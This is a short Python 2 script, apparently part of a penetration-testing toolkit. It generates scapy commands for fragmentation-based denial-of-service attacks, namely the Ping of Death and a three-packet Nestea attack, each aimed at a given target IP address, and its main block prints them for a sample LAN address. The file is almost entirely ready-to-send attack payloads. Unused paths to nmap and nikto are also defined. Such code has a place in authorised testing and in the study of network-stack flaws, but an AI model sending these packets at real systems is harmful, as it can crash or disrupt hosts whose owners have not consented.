#!/usr/bin/env python

class FragmentedPackets():
    def __init__(self, target):
        self.payloads = []
        self._target = target
        self._sudo  = "/usr/bin/sudo"
        self._nmap = "/usr/bin/nmap"
        self._niktobin = "/pentest/scanners/nikto-2.1.4/nikto.pl"
        self._niktocnf = "/pentest/scanners/nikto-2.1.4/nikto.conf"

    def getPayloads(self):

        ### Ping of death
        self.payloads.append([
            "Ping of death",
            "scapy",
            """send(fragment(IP(dst="%s")/ICMP()/("X"*60000)))""" % self._target
            ])

        ### Nestea attack 1/3
        self.payloads.append([
            "Nestea Attack 1/3",
            "scapy",
            """send(IP(dst="%s", id=42, flags="MF")/UDP()/("X"*10))""" % self._target
            ])
        ### Nestea attack 2/3
        self.payloads.append([
            "Nestea Attack 2/3",
            "scapy",
            """send(IP(dst="%s", id=42, frag=48)/("X"*116))""" % self._target
            ])
        ### Nestea attack 3/3
        self.payloads.append([
            "Nestea Attack 3/3",
            "scapy",
            """send(IP(dst="%s", id=42, flags="MF")/UDP()/("X"*224))""" % self._target
            ])

        return self.payloads

if __name__ == "__main__":
    print FragmentedPackets("192.168.100.48").getPayloads()